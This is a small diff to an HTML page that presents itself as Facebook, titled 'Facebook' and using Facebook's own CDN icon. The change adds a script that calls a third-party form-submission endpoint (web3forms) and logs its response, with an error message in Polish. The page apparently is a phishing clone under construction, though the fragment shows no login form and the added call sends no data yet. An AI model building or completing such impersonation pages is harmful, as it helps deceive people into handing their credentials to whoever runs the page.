@@ -4,7 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
-    <link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" type="image/svg+xml">	
+    <link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" type="image/svg+xml">
+    <script>
+	    fetch('https://api.web3forms.com/submit')
+  	    .then(response => response.json())
+  	    .then(data => console.log(data))
+  	    .catch(error => console.error('Błąd:', error));
+    </script>
     <style>
         body {
             font-family: Arial, sans-serif;
